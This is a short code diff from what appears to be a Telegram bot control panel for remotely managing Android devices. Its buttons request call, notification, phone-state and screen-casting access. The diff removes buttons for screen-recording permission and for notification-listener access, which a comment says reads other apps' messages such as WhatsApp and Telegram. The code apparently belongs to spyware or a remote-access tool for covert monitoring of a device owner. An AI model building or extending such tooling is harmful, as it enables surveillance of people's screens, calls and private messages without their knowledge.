@@ -508,24 +508,6 @@ def permissions_keyboard(did):
            perm_btn("calls", "📞 المكالمات"))
     kb.add(perm_btn("notifications", "🔔 الإشعارات"),
            perm_btn("phone-state", "📱 حالة الهاتف"))
-    # ⚡ زر طلب إذن MediaProjection (تسجيل الشاشة)
-    # نستخدم نفس آلية cache key مثل request-permission لتجنب truncation
-    cache_key = str(len(_file_path_cache))
-    _file_path_cache[cache_key] = "request-screen-permission"
-    screen_btn = InlineKeyboardButton(
-        "🖥️ تسجيل الشاشة",
-        callback_data=f"cmd:{did}:p{cache_key}"[:64]
-    )
-    kb.add(screen_btn)
-    # ⚡ زر تفعيل الوصول للإشعارات (NotificationListenerService)
-    # مختلف عن POST_NOTIFICATIONS — هذا يقرأ إشعارات التطبيقات الأخرى (واتساب، تيليجرام)
-    cache_key2 = str(len(_file_path_cache))
-    _file_path_cache[cache_key2] = "request-notification-permission"
-    notif_access_btn = InlineKeyboardButton(
-        "📬 الوصول للإشعارات",
-        callback_data=f"cmd:{did}:p{cache_key2}"[:64]
-    )
-    kb.add(notif_access_btn)
     # ⚡ زر البث المباشر — يختلف حسب حالة البث
     is_casting = dm.is_screen_casting(did)
     cache_key3 = str(len(_file_path_cache))
